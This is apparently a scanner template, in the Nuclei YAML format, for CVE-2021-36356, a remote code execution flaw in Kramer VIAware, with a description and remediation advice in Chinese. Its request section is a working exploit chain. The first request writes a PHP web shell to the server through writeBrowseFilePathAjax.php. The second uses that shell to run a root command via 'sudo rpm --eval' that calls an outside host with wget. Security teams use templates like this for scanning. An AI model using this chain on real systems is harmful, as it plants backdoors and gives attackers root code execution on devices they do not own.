id: CVE-2021-36356
info:
  name: Kramer VIAware - Remote Code Execution
  author:
  - gy741
  tags:
  - rce
  - viaware
  - cve
  - cve2021
  - kramer
  description: |-
    Kramer Electronics VIAware 代码执行漏洞
    Kramer Electronics VIAware是以色列克莱默电子（Kramer Electronics）公司的一套无线演示协作软件解决方案。

    Kramer Electronics VIAware 存在代码问题漏洞，该漏洞源于 KRAMER VIAware 允许远程攻击者执行任意代码，因为 ajaxPages/writeBrowseFilePathAjax.php 接受任意可执行路径名（即使 browseSystemFiles.php 不再可通过 GUI 访问）。
  reference:
  - https://www.exploit-db.com/exploits/50856
  - https://nvd.nist.gov/vuln/detail/cve-2021-36356
  - https://nvd.nist.gov/vuln/detail/cve-2021-35064
  - https://write-up.github.io/kramerav/
  severity: critical
  classification:
    cve-id:
    - cve-2021-36356
    cwe-id:
    - cwe-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://write-up.github.io/kramerav/
    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    radioBtnVal=%3C%3Fphp%0A++++++++if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%0A++++++++%7B%0A++++++++++++system%28%24_GET%5B%27cmd%27%5D%29%3B%0A++++++++%7D%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2F{{randstr}}.php
  - |
    GET /{{randstr}}.php?cmd=sudo%20rpm%20--eval%20'%25%7Blua:os.execute(%22wget%20http://{{interactsh-url}}%22)%7D' HTTP/1.1
    Host: {{Hostname}}
